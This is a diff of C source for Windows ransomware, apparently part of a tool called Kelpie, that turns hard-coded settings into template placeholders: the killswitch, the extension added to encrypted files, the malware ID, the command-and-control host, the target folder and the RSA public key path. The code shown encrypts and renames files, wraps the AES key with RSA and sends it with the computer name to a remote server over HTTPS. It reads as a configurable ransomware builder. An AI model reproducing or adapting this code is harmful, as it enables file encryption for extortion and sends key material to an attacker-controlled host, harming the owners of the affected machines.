@@ -13,7 +13,7 @@
 
 #define AES_KEY_SIZE 32
 const int RAND_URL_LEN = 40;
-const boolean ACTIVATE_KILLSWITCH = TRUE;
+const boolean ACTIVATE_KILLSWITCH = {{ activate_killswitch }};
 
 // Génère une chaîne aléatoire de lettres a-z
 void generate_random_string(char *str, size_t length) {
@@ -110,7 +110,7 @@ int encrypt_file(const char *filepath, const BYTE *key, DWORD key_len) {
     fclose(file);
     free(buffer);
     char new_filepath[MAX_PATH];
-    snprintf(new_filepath, sizeof(new_filepath), "%s.shoubadidou", filepath);
+    snprintf(new_filepath, sizeof(new_filepath), "%s.{{ file_extension }}", filepath);
     // Renommer le fichier
     if (!MoveFileA(filepath, new_filepath)) {
         fprintf(stderr, "[!] Failed to rename file: %s\n", filepath);
@@ -273,7 +273,7 @@ void send_rsa_key_info(const BYTE *encrypted_key, DWORD encrypted_len) {
 
     char post_data[2048];
     int offset = snprintf(post_data, sizeof(post_data),
-        "malware_id=hellobitch&host=%s&timestamp=%lld&key=", computer_name, (long long)now);
+        "malware_id={{ malware_key }}&host=%s&timestamp=%lld&key=", computer_name, (long long)now);
 
     for (DWORD i = 0; i < encrypted_len && offset < (int)(sizeof(post_data) - 2); ++i)
         offset += sprintf(post_data + offset, "%02X", encrypted_key[i]);
@@ -288,7 +288,7 @@ void send_rsa_key_info(const BYTE *encrypted_key, DWORD encrypted_len) {
     }
     printf("[+] WinHttpOpen succeeded.\n");
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"shoubadidou.requestcatcher.com",
+    HINTERNET hConnect = WinHttpConnect(hSession, L"{{ c2_url }}",
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect) {
         printf("[!] WinHttpConnect failed. Error: %lu\n", GetLastError());
@@ -335,8 +335,6 @@ void send_rsa_key_info(const BYTE *encrypted_key, DWORD encrypted_len) {
 }
 
 
-
-
 int main() {
     if (ACTIVATE_KILLSWITCH) {
         srand((unsigned int)time(NULL));
@@ -361,13 +359,13 @@ int main() {
     printf("[+] AES key generated. Encrypting files...\n");
 
     // Chiffrement du dossier
-    const char *target_dir = "C:\\Users\\fsali\\Documents\\fake_env_Documents";
+    const char *target_dir = "{{ folder_path }}";
     encrypt_directory(target_dir, aes_key, AES_KEY_SIZE);
     printf("[+] Encryption completed.\n");
     BYTE *encrypted_key = NULL;
     DWORD encrypted_len = 0;
 
-    const char *pubkey_path = "Kelpie\\templates\\certs\\public_key.der";
+    const char *pubkey_path = "{{ rsa_public_key_der }}";
 
     if (encrypt_aes_key_rsa_from_der(aes_key, AES_KEY_SIZE, &encrypted_key, &encrypted_len, pubkey_path)) {
         send_rsa_key_info(encrypted_key, encrypted_len);
